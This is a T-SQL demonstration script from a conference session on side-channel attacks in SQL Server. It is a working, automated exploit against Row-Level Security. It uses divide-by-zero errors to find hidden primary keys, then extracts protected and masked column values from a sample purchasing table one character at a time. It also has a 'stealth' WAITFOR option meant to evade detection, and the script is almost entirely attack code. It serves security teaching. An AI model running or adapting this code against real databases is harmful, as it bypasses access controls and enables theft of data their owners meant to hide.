/*******************************************************************
*	Session:	Side Channel Attacks in SQL Server
*	Author:		Ben Johnston
*	Name:		Demo03.RLS.04.Brute.Force.sql
*	Notes:		Automated, brute force attack against RLS
*				protected tables.
*				Generates error 8134
*				As a side-effect, it also unmasks columns.
********************************************************************/
USE WWISideChannel
GO
EXEC AS USER = 'SideChannelUser'
--It is optional to allow some rows to be accessed via RLS
--This version ignores any allowed rows and brute forces everything except valid keys
SET NOCOUNT ON

/*******************************************************************
* Declare and set the variables for this run 
* Our RLS setup blocked all rows for all users to Purchasing.PurchaseOrders
********************************************************************/
DECLARE
    @ServerName					varchar(255)			= 'localhost' 
    ,@SchemaName				varchar(255)			= 'Purchasing'
    ,@TableName					varchar(255)			= 'PurchaseOrders'		--'Suppliers'	--'PurchaseOrders'
	,@PrimaryKey				varchar(255)			= 'PurchaseOrderID'		--'SupplierID'	--'PurchaseOrderID'
    ,@EXECUTE					tinyint					= 1		-- 1 = execute, 0 = print
    ,@NOLOCK					tinyint					= 1		--1 = WITH(NOLOCK), 0 = default lock (committed)
    ,@SHOW_COLUMNS_ONLY			bit						= 0		--1 = columns only and exit, 0 = don't show column list
	,@Exclude					varchar(500)			--= 'BankAccountBranch,BankAccountCode' --CSV list of columns that will be ignored
	,@DropTempTable				bit						= 0		--1 = drop ##RLS when done, 0 = leave ##RLS for further analysis
	,@Debug						bit						= 0
	,@PrimaryKeyMax				varchar(10)				= '10000'	--Check the statistics to find the PK range / max
	,@TopRows					varchar(10)				= '20'		--NULL = all rows
	,@Stealth					char(1)					= 'n'			--Add a WAITFOR statement to elude detection Y = stealth. Anything else, full speed.
	,@StealthInterval			varchar(12)				= '00:00:10.000'		--WAITFOR interval hh:mm[[:ss].mss]


IF (@NOLOCK) =1 SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED

/*******************************************************************
* Temporary table definitions
********************************************************************/
DECLARE @Columns TABLE (
	ColumnID					int
	,ColumnName					varchar(255)
	,ColumnLength				smallint
	,HasText					tinyint
)

/********************************************************************
* Variables set internally
*********************************************************************/
DECLARE
	@SQL						varchar(max)
	,@InternalWhere				varchar(max)
	,@OrderList					varchar(max)

--Excludes geospatial data
INSERT INTO @Columns
EXEC (
    'SELECT
		SC.column_id
		,SC.name
		,CASE 
			WHEN sc.max_length = -1 THEN 100
			--WHEN sc.max_length = 0 THEN 100
			WHEN ST.name IN (' + '''' + 'nchar' + '''' + ',' + '''' + 'nvarchar' + '''' + ') THEN (SC.max_length / 2)
			WHEN ST.name IN (' + '''' + 'char' + '''' + ',' + '''' + 'varchar' + '''' + ') THEN SC.max_length
			ELSE 40 --hard code numbers to 40 wide. Verify this with different scenarios
		END	MaxLength
		,CASE
			WHEN ST.name IN (' + '''' + 'varchar' + '''' 
				+ ',' + '''' + 'nvarchar' + ''''
				+ ',' + '''' + 'char' + ''''
				+ ',' + '''' + 'nchar' + '''' + ') THEN 1
			ELSE 0
		END HasText
    FROM sys.objects SO
        INNER JOIN sys.columns SC
            ON so.object_id = sc.object_id
        INNER JOIN sys.schemas SS
            ON so.schema_id = ss.schema_id
		INNER JOIN sys.types ST
			ON SC.system_type_id	= ST.system_type_id
			AND SC.user_type_id		= ST.user_type_id
		LEFT JOIN string_split(' + '''' + @Exclude + '''' + ',' + '''' + ',' + '''' + ') SSTR
			ON SC.name COLLATE SQL_Latin1_General_CP1_CI_AS 			= SSTR.value COLLATE SQL_Latin1_General_CP1_CI_AS 
    WHERE so.name COLLATE SQL_Latin1_General_CP1_CI_AS = ' + '''' + @TableName + '''' + ' COLLATE SQL_Latin1_General_CP1_CI_AS 
        AND ss.name COLLATE SQL_Latin1_General_CP1_CI_AS = ' + '''' + @SchemaName + '''' + ' COLLATE SQL_Latin1_General_CP1_CI_AS 
        AND ST.system_type_id NOT IN (240)
		AND SSTR.value					IS NULL
    ORDER BY sc.name'
)


IF @SHOW_COLUMNS_ONLY = 1
BEGIN
	SELECT * FROM @Columns ORDER BY ColumnID
	GOTO NO_EXECUTE
END


IF (SELECT COUNT(*) FROM @Columns) = 0
BEGIN
    RAISERROR('No columns present: Check that you are running the script from the correct database, that the name of the table is correct and that you have permission to select from the table.',5,1)
	GOTO NO_EXECUTE
END


/********************************************************************
* Primary Key Columns
*
* The sample script requires a primary key column for it to work
* automatically. The primary key columns for the table specified
* are dynamically inserted into @PrimaryKeys using system tables.
*
* A candidate key can be specified via the @PrimaryKey variable
* if it is not specified on the table but the key is known.
*
* The same purpose could be achieved with ROW_NUMBER() for tables
* without a primary key. 
*********************************************************************/
DECLARE @PrimaryKeys TABLE (
	PrimaryKeyName				sysname
	,ColumnName					sysname
	,RowNumber					int			identity
)

INSERT INTO @PrimaryKeys (
	PrimaryKeyName
	,ColumnName
)
VALUES (@PrimaryKey,@PrimaryKey)

/*********************************************************************
* Create a copy of the source table
* Change the column types to NVARCHAR
**********************************************************************/
BEGIN TRY
	CREATE TABLE ##RLS (ID int)
	PRINT '##RLS Table not present. Creating'
END TRY
BEGIN CATCH
	PRINT '##RLS Table already present. Dropping and creating'
END CATCH
DROP TABLE ##RLS

DECLARE @OutputTable	varchar(max)
SELECT @OutputTable = 'CREATE TABLE ##RLS (
'

SELECT @OutputTable += CASE WHEN ColumnID = 1 THEN '' ELSE ',' END 
	+ ColumnName
	+ '	'
	+ CASE WHEN ColumnID = 1 THEN 'int PRIMARY KEY CLUSTERED
' ELSE 'nvarchar(' + CONVERT(varchar(10),ColumnLength) + ')
' END 
FROM @Columns
ORDER BY ColumnID

SELECT @OutputTable += '
)
'
EXEC(@OutputTable)


--Create the list of actual IDs in the table
--See separate example showing how to search for valid IDs, but it is essentially the same as other divide by zero checks
--Values are placed into a global temp table that can be accessed inside the EXEC and in the calling process
EXEC('
DECLARE @LEN		int = 0
	,@KeyColumn		int = 0
	,@Character		nchar(1)

DECLARE @Customers TABLE (
	' + @PrimaryKey	+ '		int
)

--Record customers that are allowed by the current users RLS rules
INSERT INTO ##RLS (' + @PrimaryKey	+ ')
SELECT ' + @PrimaryKey	+ '
FROM ' + @SchemaName + '.' + @TableName + '

WHILE @KeyColumn <= ' + @PrimaryKeyMax + '
BEGIN
	WHILE @LEN < 12
	BEGIN
		BEGIN TRY
			--SET ROWCOUNT 0
			INSERT INTO ##RLS (' + @PrimaryKey	+ ')
			SELECT C.' + @PrimaryKey	+ '
			FROM ' + @SchemaName + '.' + @TableName + ' C
			WHERE C.' + @PrimaryKey	+ '					= @KeyColumn
				AND 1/(LEN(CONVERT(varchar(12),C.' + @PrimaryKey	+ ')) - @LEN)	= 0
		END TRY
		BEGIN CATCH
			INSERT INTO ##RLS (' + @PrimaryKey	+ ')
			SELECT @KeyColumn
			WHERE @KeyColumn NOT IN (SELECT ' + @PrimaryKey + ' FROM ##RLS)

			IF (' + '''' + @Stealth + '''' + ') = ' + '''' + 'Y' + '''' + ' WAITFOR DELAY ' + '''' + @StealthInterval + '''' + '

			BREAK
		END CATCH

		SELECT @LEN += 1
	END
	
	SELECT @KeyColumn += 1
	SELECT @LEN = 0
END
')

IF (@Debug) = 1 SELECT * FROM ##RLS

--Variables for the column cursor
DECLARE
	@ColumnName					varchar(255)
	,@ColumnLength				smallint
	,@HasText					tinyint

DECLARE crsColumns CURSOR
FOR SELECT
	ColumnName
	,ColumnLength
	,HasText
FROM @Columns
WHERE ColumnID > 1
ORDER BY ColumnID

OPEN crsColumns

FETCH NEXT FROM crsColumns INTO @ColumnName, @ColumnLength, @HasText

--Dynamic version of the column level check
--Changes all columns to strings
--Does a character-by-character check and updates the the global temp table with the found values.
WHILE @@FETCH_STATUS = 0
BEGIN
	SELECT @SQL = '
		DECLARE @ID			int
			,@Character		int	= 0

		DECLARE crsRLS CURSOR
		FOR SELECT ' + ISNULL('TOP ' + @TopRows,'') + ' ' + @PrimaryKey + '
		FROM ##RLS C
		ORDER BY ' + @PrimaryKey + '

		OPEN crsRLS
		FETCH crsRLS INTO @ID

		WHILE @@FETCH_STATUS = 0
		BEGIN
			DECLARE @SubstringLen int = 1
			WHILE @SubstringLen <= ' + CONVERT(varchar(10),@ColumnLength) + '
			BEGIN
				SELECT @Character = 32 --Start with space character --Letters, etc. were not excluded since they end at 57. Also then includes characters for time, etc.
				WHILE @Character <= 127--Only process the ASCII character set. Could be expanded at the cost of time. Removed logic to limit characters for numbers. No speed difference (numbers found before alpha).
				BEGIN
					BEGIN TRY
						INSERT INTO ##RLS (' + @PrimaryKey + ', ' + @ColumnName + ')
						SELECT C.' + @PrimaryKey + ', C.' + @ColumnName + '
						FROM ' + @SchemaName + '.' + @TableName + ' C
						WHERE C.' + @PrimaryKey + ' = @ID
							AND 1 / (
									CASE SUBSTRING(CONVERT(NVARCHAR(' + CONVERT(nvarchar(10),@ColumnLength) + '),' + @ColumnName + '),@SubstringLen,1) COLLATE SQL_Latin1_General_CP1_CS_AS WHEN NCHAR(@Character) THEN 0 ELSE 1 END --Use COLLATE to get the correct case. Increases time to decode.
								) = 0
					END TRY
					BEGIN CATCH
						UPDATE ##RLS 
						SET ' + @ColumnName + ' = ISNULL(' + @ColumnName + ',' + '''' + '''' + ') + NCHAR(@Character) 
						WHERE ' + @PrimaryKey + ' = @ID

						IF (' + '''' + @Stealth + '''' + ') = ' + '''' + 'Y' + '''' + ' WAITFOR DELAY ' + '''' + @StealthInterval + '''' + '

						BREAK --Stop processing this row / character when the correct value is found
					END CATCH
					
					SELECT @Character += 1
				END
				SELECT @SubstringLen += 1
			END
			SELECT @SubstringLen = 1
			FETCH crsRLS INTO @ID
		END

		CLOSE crsRLS
		DEALLOCATE crsRLS'
	IF (@Debug) = 1 PRINT @SQL
	
	IF (@EXECUTE) = 1
	BEGIN
		EXEC(@SQL)
	END

	FETCH NEXT FROM crsColumns INTO @ColumnName, @ColumnLength, @HasText
END

CLOSE crsColumns
DEALLOCATE crsColumns

--Order by ordinal position. Not recommended but the alternative is to create dynamic SQL for this final SELECT
--If the POC is expanded for compound keys, a dynamic query for the output would probably work best
SELECT * FROM ##RLS ORDER BY 1

IF @DropTempTable = 1
BEGIN
	DROP TABLE ##RLS
END

NO_EXECUTE:

GO

REVERT
GO

--SELECT USER_NAME(),* FROM Purchasing.Suppliers
